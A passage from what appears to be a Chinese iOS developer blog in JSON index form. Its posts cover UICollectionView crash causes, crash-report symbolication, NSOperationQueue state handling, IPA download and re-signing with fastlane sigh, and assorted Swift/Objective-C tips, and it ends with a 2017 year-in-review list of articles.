也是一种常见的DataSource和ViewCollection没有对齐的错误，常见于Insert操作 如果同时Insert一组Sect和一个Item，恰巧Insert的Item是此前Insert的Sect，导致Sect总数没有变化 导致的 123456789101112131415161718//准备结果容器var sectSet = IndexSet()var itemIndex = [IndexPath]()//插入一整个Sect//此时整个sects共有5个元素，而不是之前的4个sects.insert([&quot;Insert&quot;, &quot;Insert&quot;, &quot;Insert&quot;], at: 1)//在原本第二个Sect头部插入一个元素//此时 原本的sects[1] 变成了 sects[2]//当下的 sects[1] 为新插入的元素sects[1].insert(&quot;InsertItem&quot;, at: 0)//储存结果sectSet.insert(1)//此处就产生了构造错误, 因为 InsertItem 已经包含在sectSet里了itemIndex.append(IndexPath(item: 0, section: 1))//输入结果作为入参complete(sectSet, itemIndex)//Crash 值得一提的是，如果外部没有使用BatchUpdate（上文中错误的用法）才会产生这种Crash 如果使用了 BatchUpdate 则会产生上一个Crash原因 non-nil layout parameter1UICollectionView must be initialized with a non-nil layout parameter 通常是使用了错误的初始化方法，正确的方式是 1234567//根据layout初始化let layout = CustomLayout()let collection = UICollectionView(frame: CGRect.zero, collectionViewLayout: layout)//初始化后更换layoutlet layout = CustomLayout()let collection = UICollectionView(frame: CGRect.zero, collectionViewLayout: UICollectionViewFlowLayout())collection.setCollectionViewLayout(layout, animated: false)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"DSYM符号文件的相关配置","date":"2018-06-10T15:00:00.000Z","path":"2018/06/11/DSYM符号文件的相关配置/","text":"Xcode 的设置在 Build Setting中和是否产生符号文件的配置的选项有两个 配置 Debug默认值 Release默认值 GCC_GENERATE_DEBUGGING_SYMBOLS YES YES DEBUG_INFORMATION_FORMAT dwarf dwarf-with-dsym 作用分别是 GCC_GENERATE_DEBUGGING_SYMBOLS : 作为总开关控制GCC编译器是否产生符号文件 DEBUG_INFORMATION_FORMAT : 产生符号文件后如何Format，如果想让Xcode可以解析需要配置 dwarf-with-dsym 参考更多配置信息的文章 Xcode中和symbols有关的几个设置","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"ImageView模仿系统相册缩放","date":"2018-06-09T15:00:00.000Z","path":"2018/06/10/ImageView模仿系统相册缩放/","text":"系统相册缩放效果Google遍中英文网络大抵就两种方案 借助ScrollView,调整ContentSize 使用Pinch手势进行Transform运算达到缩放效果 方案1 更加简洁易用，可以参考GitHub仓库代码GOBScaleImageView 核心代码 1234567func resizeContent() &#123; let heightGap = max((self.frame.size.height - self.contentSize.height)/2, 0) let widthGap = max((self.frame.size.width - self.contentSize.width)/2, 0) UIView.animate(withDuration: 0.1) &#123; [weak self] in self?.contentInset = UIEdgeInsets(top: heightGap, left: widthGap, bottom: heightGap, right: widthGap) &#125;&#125; 方案1核心思路 使用ScrollView作为Container 通过代理在Zoom的生命周期中resizeContent() 通过resizeContent()保证ScrollView的contentSize始终居中并且等于ImageView大小 调整的方式是通过设置ScrollView的contentInset 参考文章国内采用方案1的Blog，但是大多数都没考虑到图片如果大于屏幕和小于屏幕的情况，不能完全模拟系统相册 使用UIScrollView实现图片缩放 iOS 图片浏览的放大缩小 ios 利用UIScrollView实现图片缩放 iOS之图片缩放的几种方法 国外提出了方案1的方案，但是也都缺少细节的描述 How to have images that pinch-zoom in a paginating scroll view in iOS? IOS: add imageview in a scrollview to have zoom UIImageView pinch zoom swift 关于如果在图片所小时调整Center的方案，大多数采用了设置center属性，而没有使用ContentInset Center content of UIScrollView when smaller Center UIImageView in UIScrollView 使用方案2的参考代码, 计算十分复杂需要一定的数学分析 TimOliver/UIScrollView+ZoomToPoint.m","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"iOS8旋转动画禁止的更新","date":"2018-06-08T15:00:00.000Z","path":"2018/06/09/iOS8旋转动画禁止的更新/","text":"废弃的版本废弃的第一版 12345678910111213- (void)didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation &#123; [UIView setAnimationsEnabled:YES];&#125;- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation &#123; [UIView setAnimationsEnabled:NO]; /* Your original orientation booleans*/ return TRUE;&#125; 废弃的第二版 12345678910override func willRotateToInterfaceOrientation(toInterfaceOrientation:UIInterfaceOrientation, duration:NSTimeInterval) &#123; UIView.setAnimationsEnabled(false) super.willRotateToInterfaceOrientation(toInterfaceOrientation,duration:duration)&#125;override func didRotateFromInterfaceOrientation(fromInterfaceOrientation:UIInterfaceOrientation) &#123; super.didRotateFromInterfaceOrientation(fromInterfaceOrientation) UIView.setAnimationsEnabled(true)&#125; 可行的版本在iOS7之后加入了调度器类型 UIViewControllerTransitionCoordinator, 由UIKit创建给开发者使用 1Typically, you do not adopt this protocol in your own classes. When you present or dismiss a view controller, UIKit creates a transition coordinator object automatically and assigns it to the view controller’s iOS8提供了一个新接口来拦截生命周期 12345678910override func viewWillTransition(to size: CGSize, with coordinator: UIViewControllerTransitionCoordinator) &#123; coordinator.animateAlongsideTransition(in: nil, animation: &#123; (context) in UIView.setAnimationsEnabled(false) &#125;) &#123; (context) in UIView.setAnimationsEnabled(true) &#125; super.viewWillTransition(to: size, with: coordinator) &#125;","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"iOS11可用容量读取的改变","date":"2018-06-07T15:00:00.000Z","path":"2018/06/08/iOS11可用容量读取的改变/","text":"iOS11 之前旧版代码旧版代码的思路 寻找到任意一个文件夹，通常是沙盒Document 通过文件系统读取Document文件夹的属性 得到剩余的最大空间作为可用容量 12345678910if let documentDirectory = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true).last, let systemAttributes = try? FileManager.default.attributesOfFileSystem(forPath: documentDirectory), let freeSize = systemAttributes[.systemFreeSize] as? NSNumber&#123; print(&quot;Available capacity for important usage: \\(freeSize.int64Value)&quot;)&#125; else &#123; print(&quot;Capacity is unavailable&quot;)&#125; iOS11 之后新版代码使用苹果官方更加精细的Key值来描述 获取到URL 通过资源描述Key值来获取信息 12345678910111213let fileURL = URL(fileURLWithPath:&quot;/&quot;)do &#123; let values = try fileURL.resourceValues(forKeys: [.volumeAvailableCapacityForImportantUsageKey]) if let capacity = values.volumeAvailableCapacityForImportantUsage &#123; print(&quot;Available capacity for important usage: \\(capacity)&quot;) &#125; else &#123; print(&quot;Capacity is unavailable&quot;) &#125;&#125; catch &#123; print(&quot;Error retrieving capacity: \\(error.localizedDescription)&quot;)&#125; 改变的原因和文档iOS10之后苹果提供了更加灵活的对URL（唯一资源链接，文件属于资源）的描述方式 URLResourceKey 猜测可能是来配合自己的文件系统，例如官方文档中提到的两点 Key 用处 volumeAvailableCapacityForImportantUsageKey 用于导入的重要的资源文件，例如下载视频 volumeAvailableCapacityForOpportunisticUsageKey 可被压缩的的不重要的资源，例如订阅的广播 参考文章StackOverflow","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"iOS储存自定义类进入UserDefaults","date":"2018-06-06T15:00:00.000Z","path":"2018/06/07/iOS储存自定义类进入UserDefaults/","text":"自定义类的持久化在储存自定义Class进入NSUserDefaults的时候，可能会报错 1Attempt to set a non-property-list object as an NSUserDefaults 解决的方案是转化为NSData，因为NSUserDefaults只能储存固定Type的数据，和NSCoding协议没有关系 转化为NSData1234let data = try? NSKeyedArchiver.archivedData(withRootObject: customObject, requiringSecureCoding: false)UserDefaults.standard.set(data, forKey: &quot;StoreData&quot;)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"}]},{"title":"iOS崩溃闪退Crash分析原因","date":"2018-06-05T15:00:00.000Z","path":"2018/06/06/iOS崩溃闪退Crash分析原因/","text":"官方的分析文档苹果官方十年间（2009-01-29 ～ 2018-01-08）维护了一个关于Crash分析的文档十分有价值，主要讲解了以下内容 什么是符号，符号和App的关系 如何符号化（让人看得懂） 如何分析各种Crash的可能原因 内存和CPU的使用限制引起的Crash 本篇博客记录其中一些重点，推荐大家都去阅读原文 符号化某个地址的命令行工具在 Symbolicating Crash Reports With atos 章节里提到了命令行 atos(addresses to symbols) 可以帮助我们单行符号化某个地址 12345678910## 解释# atos -arch &lt;Binary Architecture&gt; \\# -o &lt;Path to dSYM file&gt;/Contents/Resources/DWARF/&lt;binary image name&gt; \\# -l &lt;load address&gt; &lt;address to symbolicate&gt;## 实践atos -arch arm64 -o TheElements.app.dSYM/Contents/Resources/DWARF/TheElements -l 0x1000e4000 0x00000001000effdc-[AtomicElementViewController myTransitionDidStop:finished:context:] 如何区别OC的Crash和NULL指针的Crash异常一般来说分为 OC 层的 NSException 和 底层的 NULL 错误，可以通过Crash报告的字段不同进行分析 OC层的长这个样子，包含Type、Codes、Note 三个字段 12345Exception Type: EXC_CRASH (SIGABRT)Exception Codes: 0x0000000000000000, 0x0000000000000000Exception Note: EXC_CORPSE_NOTIFYTriggered by Thread: 0 NULL错误的长这个样子，包含 Type、SubType、Signal、Reason、Process等多个字段 123456Exception Type: EXC_BAD_ACCESS (SIGSEGV)Exception Subtype: KERN_INVALID_ADDRESS at 0x0000000000000000Termination Signal: Segmentation fault: 11Termination Reason: Namespace SIGNAL, Code 0xbTerminating Process: exc handler [0]Triggered by Thread: 0 常见的 EXC SIG 崩溃原因分析Bad Memory Access [EXC_BAD_ACCESS // SIGSEGV // SIGBUS]访问了错误的内存，内存在使用时会有一定的保护等级，例如只可读，可读可写 官方文档列举了以下的常见原因： 如果堆栈顶部最后调用 objc_msgSend 或者 objc_release，大概率是访问了一个本来应该被释放的对象，可以通过僵尸对象（ Zombies instrument）调试方法来查找 gpus_ReturnNotPermittedKillClient 如果这个在堆栈顶部，一般都是OpenGL ES 或者 Metal 在后台渲染了什么东西 这种常见的内存访问错误的Crash，也可以在开发的Debug阶段开启 Address Sanitizer 他会帮你进行警告 Abnormal Exit [EXC_CRASH // SIGABRT]异常退出，一般都是有没有Catch住的 OC/C++ 的异常导致的 官方文档列举了一种可能情况是 如果你的App每次启动就Crash，可能是你的启动App的时候写的逻辑太多了，被系统的看门狗干掉了，简化你的启动逻辑 Trace Trap [EXC_BREAKPOINT // SIGTRAP]这种类似于异常退出，主要是在代码里主动插入 __builtin_trap() 方法来给debugger提供调试的能力 如果没有debugger就会Crash，底层的一些库用他来处理一些重要的异常 根据官方文档描述，这种日志应该只会存在于Debug期间，常见的是Swift中的两种情况 给一个非optional的变量赋值了nil 或者错误的强制类型转换 Illegal Instruction [EXC_BAD_INSTRUCTION // SIGILL]这个错误比较硬核，代表着执行了一个未定义的指令，或者是跳转到了一个非法的地址 其中前者 EXC_BAD_INSTRUCTION 多由Intel的 ud2 opcode 产生 目前文档中没有其他的官方提示 Quit [SIGQUIT]这个是退出信号，一般来讲都是错误的操作或者被其他任务结束了 官方文档举出一个例子，比如键盘程序在某个App中被唤醒，如果长时间没有弹出来，就会被App杀掉，通过这个信号 从文档来看，如果出现了这个Crash，可以从输入框优先排查 Killed [SIGKILL]这个信号和Quit的区别在于该App被系统强杀掉了，经常出现在Watch App中，有三个编码代表三个意思 代码 含义 0xc51bad01 Watch App在后台的任务占用了太多CPU，优化后台任务逻辑解决 0xc51bad02 Watch App在后台的任务alloc失败，减少后台任务可以解决 0xc51bad03 Watch App在后台的任务alloc失败，这个和 02 的区别在于不是App的原因，更可能是系统能力不足 Guarded Resource Violation [EXC_GUARD]这个异常只会发生在MacOS或者早期的iOS版本，原因是系统会将某些文件设为保护，如果使用普通的文件操作方法去访问，就会报错 正确的方式是使用系统的私有API访问，但是这些错误都有比较详细的描述，可以通过描述确定是哪个方法产生Crash Resource Limit [EXC_RESOURCE]使用了过多的资源，这里的资源包括内存和CPU两种，可以通过Exception Subtype来区别 出现这个报告不代表App一定产生了Crash，当Exception Note 包含了 NON-FATAL CONDITION 字眼时，代表仅仅是警告，并没有真的Crash 官方文档详细的解析了SubType SubType 含义 MEMORY 使用了过多的内存，会产生被系统强制杀掉的风险 WAKEUPS 代表某个Thread每秒钟唤醒次数太多了，这样会导致CPU唤醒次数过多从而消耗电量 不常见的Crash （Other Exception Types）苹果还列举了一系列不常见的Crash的ID，例如 0xbaaaaaad、0xbad22222、0x8badf00d、0xc00010ff、0xdead10cc、0x2bad45ec 大多这些Crash没有什么共性，都是很特别的Case，如果实在找不到答案，建议直接联系苹果官方 Low Memory 的原因总结在所有的Crash报告里，还需要关注的是一种和Crash报告头部很像，但是用于描述低内存情况的报告 iOS的内存机制中，如果触发了低内存阈值，系统级会有通知让所有App进行内存回收，如果进行完第一轮回收后，内存仍然不够 系统就会尝试杀掉当前的进程（process），具体机制不知道是不是随机的 如果你运气不好，你的App被干掉了，就会收获一个Low Memory Report，它和Crash Report的区别在于没有堆栈 而当前导致Low Memory的原因，就会被记录在最重要的 table of processes 的 reason 字段 ，常见的原因如下 Reason 描述 per-process-limit 单一进程超过了系统规定的进程内存限制大小，常见于使用了MapView、SpriteKit的模块 vm-pageshortage/vm-thrashing/vm 进程被强制杀掉了 vnode-limit 打开了太多的文件 highwater 系统的守护进程超过了最大值（水位线） jettisoned 不知道什么原因，总之进程被废弃了 最重要的一点：如果你没有看到之上的原因，那么你这个报告就不是 Low Memory Report 关于其他内存的文章，可以参考Memory Usage Performance Guidelines，我还没看，但是看名字很厉害","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"OC","slug":"OC","permalink":"http://yoursite.com/tags/OC/"}]},{"title":"IPA安装包下载和重签名","date":"2018-06-04T15:00:00.000Z","path":"2018/06/05/IPA安装包下载和重签名/","text":"如何下载IPA安装包在目前最新版本的Mac系统，iTunes已经移除了App商店无法再下载IPA安装包之后安装到手机 所以如果想获得其它公司的IPA只能抓包下载，这个复杂程度就比较高，不太适合不常下载的同学 有一款工具软件 Apple Configurator 可以协助我们进行下载，只需进行如下操作 从Mac App Store下载 Apple Configurator 2 点击 Account —— SignIn 登陆自己的AppleID账号（安全性未知，推荐登陆没有绑定支付手段的） 连接 iOS Device到电脑，并且点击信任 点击 Add —— Apps 就可以看到自己账户购买到的所有App 选择一个已经在 iOS Device上安装过的App，点击添加 等待下载结束，会因为存在重复的App有一个提示框弹出，此时不要点击任何操作 打开缓存目录 “～/Library/Group\\ Containers/K36BKF7T3D.group.com.apple.configurator/Library/Caches/Assets/TemporaryItems” 依次寻找即可发现IPA文件 最关键的第六步骤如下图所示 相关参考文档有How to Download IPA Files on macOS High Sierra和如何在Mac上获取App Store的ipa包，中文的更加全面和细致 准备重签名工具重签名工具目前最有效并且长期维护的是 fastlane出品的sigh 官网的比较有意思指出了这个工具是 用来节省你和签名斗争的时间用的 1Because you would rather spend your time building stuff than fighting provisioning 和参考文章Mac下给iOS的ipa重签名所说的不同，其实没有必要先安装ruby，Mac本身就自带 1sudo gem install sigh -n &#x2F;usr&#x2F;local&#x2F;bin 需要多出 -n 的原因是因为Mac系统在某个版本修改了根目录访问权限，可以参考write permissions into the /usr/bin when installing Rails 查找ProvisionProfile可以通过本地路径或者Developer Center来查找你的证书和Profile 本地路径位于 “~/Library/MobileDevice/Provisioning Profiles” 参考StackOverflow回答 进行重签名在准备好了IPA包和有效的证书和ProvisionProfile之后，可以按照参考文章Mac下给iOS的ipa重签名 1、输入sigh resign，回车2、把要签名的ipa文件拖到窗口上，回车3、填写用来签名的证书，回车4、把embedded.mobileprovision文件拖到窗口上，回车5、好了，resign脚本会自动更改bundel id，签名并重新打包。 或者更加简单的方法，来完成批量操作（我使用的是2.0.1版本，非文章中的1.4版本） 把所有IPA和ProvisionProfile放入同一个文件夹 切换terminal 到该文件夹 执行 sigh resign 就是批量完成目录下的所有IPA重签名","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"}]},{"title":"NSOperationQueue的注意点","date":"2018-06-03T15:00:00.000Z","path":"2018/06/04/NSOperation和NSOperationQueue的基础用法/","text":"基础概念根据文章iOS多线程之NSOperation和苹果官方文档Class NSOperation可以得知以下概念 NSOperationQueue： 本身是个队列+线程池，可以执行一系列的函数 NSOperation： 本身是一段可执行的代码，类似Java的 Runnable 对于想做任务管理的开发者，只需要创建NSOperation 并且add 进入Queue即可顺序执行，值得注意的是NSInvokeOperation在Swift里被干掉了 Class OC Swift NSBlockOperation YES YES NSInvocationOperation YES NO 并发和异步（Concurrent and Asynchronous）在 NSOperationQueue 里仅仅支持并发（Concurrent）并不支持串行（Parallel） 而在 NSOperation 中有一个只读属性 （Asynchronous）可以来控制该Operation是否异步开启 关于两者的区别在于 关键词 定义 Concurrent 决定了当前Queue作为线程池最多使用几个Thread Asynchronous 标记当前Operation执行star()时是在当前Thread还是开启新的Thread 苹果官方本身并不推荐用户操作 Asynchronous ，而且需要自己继承 NSOperation 之后控制KVO，并且在官方文档着重强调 1When you add an operation to an operation queue, the queue ignores the value of the asynchronous property and always calls the start method from a separate thread. Therefore, if you always run operations by adding them to an operation queue, there is no reason to make them asynchronous. 因为 NSOperationQueue 本身并没有Handler所有的KVO状态组合，所以在重写 Operation 时要着重注意 能否获取当前执行的Operation如果不重写Operation无法获得，虽然我们拥有 queue.operations 数组 而且每当Operation进入了 isFinished 状态后就会从当前的队列移出并且被释放掉 但是因为有 queuePriority 和 maxConcurrentOperationCount的原因 self.queue.operations[0]并不一定是正在执行的Operation 简单控制重写Operation的注意点继承了NSOperation之后第一种情况就是简单的重写main()函数 只需要控制好 isCancelled 标记位即可 其他的标记位不要重写KVO，即可完成 Synchronous同步执行某个Operation 复杂的Operation的main()中包含异步调用通常我们重写NSOperation后还会包含很多异步接口，例如从网上下载图片 实现main函数中异步调用完成Operation有两种方法 使用信号量拥塞当前Thread使用信号量控制十分简单，但是会拥塞当前Thread，Queue本来就是线程池 如果没有特殊需要推荐使用信号量 12345let semaphore &#x3D; DispatchSemaphore(value: 0)image.downloadComplete &#123; semaphore.signal()&#125;semaphore.wait() 重写KVO来协助Queue完成控制此时就需要更多的标记位来帮助我们控制Queue的执行，因为 NSOperationQueue 并没有Handler所有的KVO状态组合 所以一旦重写KVO之后的状态进入某种错误的组合，整个Queue队列会被卡死， 例如 isFinished = NO isCanceled = YES isReady = YES 的情况当前执行的任务既不会结束，也不会开始main()函数 下面列举一些个人操作中卡死的原因帮助排查 重写了Cancel方法，但是在Cancel后没有控制isFinish导致Queue无法完成，例如main函数中检测到Cancel直接就返回了 isFinish没有和isExecuting状态一起更改，或者isFinish在isExecuting之前改变 isReady的没有重写，导致任务无法开始卡死 逻辑结束后错误的把 isFinish 赋值为 False 或者把 isExecuting赋值为True 因为存在Concurrent，在上一个Operation还没有结束直接Cancel了有待执行的Operation，被Cancel的Operation根本没有执行就变成了Finish，卡死队列，正确的情况应该是 isCancel = YES , isFinished = NO 更详细的控制逻辑，可以参考GNU的开源NSOperation实现来减少卡死的行为","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"Swift","slug":"Swift","permalink":"http://yoursite.com/tags/Swift/"}]},{"title":"OC实现链式调用","date":"2018-06-02T15:00:00.000Z","path":"2018/06/03/OC实现链式调用/","text":"链式调用使用JS的人都知道JS存在很多链式调用 obj.a().b().c() ，使用起来十分方便 而且Kotlin、Swift等新型语言也都开始推荐这一种语言特性 OC的简单实现OC中最常见使用链式调用的就是 SapKit/Masonry 其核心实现方法可以概括成 类-的-（实例方法）-返回-（返回值为类本身的Block） 这种断句方式 核心部分的代码为 1234567891011121314&#x2F;&#x2F;定义一个类@class LinkCallObject;&#x2F;&#x2F;定义一个Block为返回值（返回值为类本身的Block）typedef LinkCallObject * _Nonnull(^linkPrint)(NSString *message);&#x2F;&#x2F;实例方法- (linkPrint)print &#123; &#x2F;&#x2F;返回 return ^LinkCallObject *(NSString *message) &#123; NSLog(@&quot;%@&quot;, message); return self; &#x2F;&#x2F;此处是unescape的Block所以不会循环引用 &#125;;&#125; 细节优化通过以上定义就可以使用链式调用 如果想省略链式调用里某些括号，整体更加美观，OC可以使用宏来消除 12345678&#x2F;&#x2F;Convenience to call start#define startAlign start()typedef LinkCallObject * _Nonnull(^linkFlag)(void);- (linkFlag)start; 调用的方法就可以产生如下变化 1object.start().print(@&quot;text&quot;) ---&gt; object.startAlign.print(@&quot;text&quot;)","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"}]},{"title":"保存媒体到相册的一些问题","date":"2018-06-01T15:00:00.000Z","path":"2018/06/02/保存媒体到相册的一些问题/","text":"需要后缀名调用 PHPhotoLibrary 的接口的时候，需要以有效的后缀名结尾，不然会储存失败 12345678910111213141516PHPhotoLibrary.shared().performChanges(&#123; //在拼接URL的时候，必须以有效媒后缀结尾 // xxx.png xxx.jpg xxx.mp4 let url = NSURL.fileURL(withPath: path+&quot;/StorePhotosController.png&quot;); PHAssetChangeRequest.creationRequestForAssetFromImage(atFileURL: url) &#125;) &#123; [weak self](success, err) in DispatchQueue.main.async &#123; if (success) &#123; self?.text.text = &quot;Store image success&quot; &#125;else &#123; self?.text.text = &quot;Store image \\(err.debugDescription)&quot; &#125; &#125; &#125; 4K和高帧率储存问题并不是所有的媒体文件都可以储存进入相册，例如4K的MP4文件，和机型相关，简单的判断条件是 iPhone自带相机可以录制的最高分辨率最高帧率的视频降低一个指标，例如4K 120FPS，那么可以储存的是4K 60FPS 目前没有发现官方的列表，有人知道谢谢指正","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"判断是否使用了模拟器","date":"2018-05-31T15:00:00.000Z","path":"2018/06/01/判断是否使用了模拟器/","text":"判断模拟器判断是否是模拟器的常用方法 How can I programmatically determine if my app is running in the iphone simulator? OC12345#if TARGET_OS_SIMULATOR &#x2F;&#x2F; Simulator-specific code#else &#x2F;&#x2F; Device-specific code#endif SwiftSwift中无法使用Macro，可以用另外一个表达式 what’s wrong with my #if TARGET_OS_SIMULATOR code for Realm path definition? 12345#if arch(i386) || arch(x86_64) // Simulator-specific code#else // Device-specific code#endif","tags":[{"name":"iOS","slug":"iOS","permalink":"http://yoursite.com/tags/iOS/"},{"name":"UI","slug":"UI","permalink":"http://yoursite.com/tags/UI/"}]},{"title":"2017年的文章","date":"2017-12-31T15:00:00.000Z","path":"2018/01/01/2017年的文章/","text":"记2017加班加到吐血，文章整理了一年才发出来，好处就是有很多机会来纠错，但是也不保证都是对的，希望能帮助到需要的人 年终奖比HR承诺的少好多，但是团队很喜欢，希望以后收入能高一些 感觉今年最开森的是回答了一个StackOverflow上一个多年未有正确答案的问题 123456789101112131415161718192021222324252627282930313233343536&#x2F;&#x2F; There is a world where hope&#x2F;&#x2F; And dreams can last for all time&#x2F;&#x2F; (Jane):&#x2F;&#x2F; A wonderous place to go&#x2F;&#x2F;&#x2F;&#x2F; You&#39;ll know it&#x2F;&#x2F; When your heart finds&#x2F;&#x2F;&#x2F;&#x2F; (Belle):&#x2F;&#x2F; Hearing our song as old as rhyme&#x2F;&#x2F; (Dumbo):&#x2F;&#x2F; Hold my hand we&#39;re gonna fly&#x2F;&#x2F;&#x2F;&#x2F; What a magic ride&#x2F;&#x2F; If you can dream the wish we&#39;re making&#x2F;&#x2F;&#x2F;&#x2F; (Pinocchio):&#x2F;&#x2F; On a star is coming true&#x2F;&#x2F; (PocaHontas):&#x2F;&#x2F; The colors of the wind will lead&#x2F;&#x2F; (Belle):&#x2F;&#x2F; It&#39;s certain as the sunrise&#x2F;&#x2F; (Cinderella):&#x2F;&#x2F; One day the slipper fits&#x2F;&#x2F; (Belle):&#x2F;&#x2F; It&#39;s the tale as old as time&#x2F;&#x2F;&#x2F;&#x2F; There&#39;s no mountain we can&#39;t climb&#x2F;&#x2F;&#x2F;&#x2F; (Belle):&#x2F;&#x2F; Never die the rose&#x2F;&#x2F; (Jasmine):&#x2F;&#x2F; There&#39;s a whole new world&#x2F;&#x2F;&#x2F;&#x2F; So the story goes&#x2F;&#x2F; Waiting there for us 如何制作一个UmbrellaFramework Apple MapKitMKMapKit(一)：火星坐标坐标系转换 MKMapKit(二)：自动纠偏 MKMapKit(三)：获得ContainerView MKMapKit(四)：拦截地图的操作手势 MKMapKit(五)：调用自带地图导航 MKMapKit(六)：指南针模式 MKMapKit(七)：指南针追踪工具 MKMapKit(八)：动态Overlay绘制 MKMapKit(九)：动态圆形DynamicCircleOverlay MKMapKit(十)：动态轨迹DynamicPathOverlay MKMapKit(OVA)：自定义追踪模式下如何平滑动画 MKMapKit(OVA2)：Annotation返回nil的问题 Core AnimationCAAnimation(一) 动画的分类和继承树 CAAnimation(二) 动画的原理 CAAnimation(三) 可用的动画KeyPath CAAnimation(四) SubLayer隐式动画的关闭和Completion技巧 CAAnimation(五) 部分动画示例-雷达、旋转 CAAnimation(六) 利用SubLayer完成线性动画 CAAnimation(七) 利用CATransaction完成动画平滑过度 CAAnimation(八) MaskView和SubLayer组合动画 今年遇到了一些和自己不一样的人，也感觉自己确实可能太天真了 但是即使把要”做最受尊敬的公司”印在公司饭堂的餐纸上，也要知道尊敬不是用钱买来的 123&#x2F;&#x2F; (PocaHontas):&#x2F;&#x2F; You think the only people who are people&#x2F;&#x2F; Are the people who look and think like you Xcode工程模块化相关工作模块化与Compile(01)：编译过程 模块化与Compile(02)：Mach-O文件 模块化与Compile(03)：Undefined和Duplicate 模块化与Compile(04)：符号表 模块化与Compile(05)：Target和Link的关系 模块化与Xcode(06)：Target和Class进行Load的关系 模块化与Xcode(07)：Target和Resource的关系 模块化与Xcode(08) Target和Workspace、Project的关系 模块化与Xcode(09)：TargetDependencies的正确用法 模块化与Xcode(10)：LinkBinaryWithLibraries和符号表的关系 模块化与StaticLib(11)：StaticLib互相Link不Duplicated的原因 模块化与Framework(12)：Framework的基本介绍 模块化与Framework(13)：多版本和Umbrella Framework 模块化与Framework(14)：静态编译Static Framework 模块化与Framework(15)：特殊的Unique Framework 模块化与Framework(16)：Unique Framework制作步骤 模块化与Framework(17)：StaticFramework伪装Bundle 模块化与Framework(18)：头文件批量更改 模块化与Framework(19)：常见的头文件问题 模块化与Framework(20)：C++头文件和C文件错误解析 模块化与Framework(21)：引用非Framework模块Include of non-modular header 模块化与Framework(22)：常见真机调试崩溃Crash 模块化与Framework(23)：StaticLib混合引用测试 模块化与Shell(24)：常用的工具 模块化与CocoaPods(25)：StaticLib和Framework两种方式引入Pods 模块化与CocoaPods(26)：管理多Project 模块化与CocoaPods(27)：使用FrameworkPod协调多工程 模块化与Unity(28)：DynamicHeapAllocator和MKMapKit渲染的冲突 模块化(31)：Link对Mach-O图解总结 虽然我很穷，很缺钱，我还是希望自己可以成为某种pioneer 1234567&#x2F;&#x2F; (Ariel):&#x2F;&#x2F; I don’t know when&#x2F;&#x2F; I don’t know how&#x2F;&#x2F; But I know something’s starting right now&#x2F;&#x2F; Watch and you’ll see&#x2F;&#x2F; Someday I’ll be&#x2F;&#x2F; Part of that world! Swift 从入门到再次入门Swift的flatMap的用法 Swift的where用法 Swift的defer用法 Swift的function变量引起CircleRetain Swift的map/reduce/filter的用法 Swift的readonly声明 Swift的throw和rethrow 今年还总觉得自己刚刚毕业，说实话上学的时候都没感觉到自己过得这么充实 但是太累了，深圳的奋斗逼真不是张江的小资和五道口的屌丝能够体会的 12345678&#x2F;&#x2F; (Mulan):&#x2F;&#x2F; Tranquil as a forest&#x2F;&#x2F; But on fire within&#x2F;&#x2F; Once you find your center you are sure to win&#x2F;&#x2F; You&#39;re a spineless, pale pathetic lot&#x2F;&#x2F; And you haven&#39;t got a clue&#x2F;&#x2F; You&#39;re unsuited for the rage of war&#x2F;&#x2F; So pack up, go home you&#39;re through TrickOC的init函数中self运行时指向问题 自定义UI如何被XCTestUI测试识别 UIImage如何转换成CALayer UIViewController无法响应Gesture 结构体Struct转对象 循环引用与闭包逃逸 beginTracking与touchesBegan的异同 如何利用Playground实时预览界面 Xcode的Build参数Dump KVO对象的正确移除 AnchorPoint的修改和原理 模仿iPhone7Plus的相机变焦轮盘 Git目录重复导致ignore不掉 稳定高频函数调用的技巧 如何打印RetainCount StackView改背景色 长按复制的UILabel 如何设置阴影 局域网流量也需要获取数据访问权限 NSArray的setValue:forKey: Swift中Runtime的UnsafeRawPointer的问题 UILabel的自适应 String、Data、Base64的转换以及编码原理 GestureRecognizer会取消掉Touch的生命周期 Gesture和UIControl触发顺序 JavaJava多线程预习小笔记 还有我发现心里放不下的人已经放下了，感觉真的很奇怪 123456789&#x2F;&#x2F; (PocaHontas):&#x2F;&#x2F; The birds move on so they survive&#x2F;&#x2F; When snow&#39;s so deep the bears all sleep to keep themselves alive&#x2F;&#x2F; They do what they must for now and trust in their plan&#x2F;&#x2F; If I trust in mine, somehow, will I find who I am&#x2F;&#x2F; And where do I go from here?&#x2F;&#x2F; So many voices ringing in my ear&#x2F;&#x2F; Which is the voice that I was meant to hear&#x2F;&#x2F; How will I know where do I go from 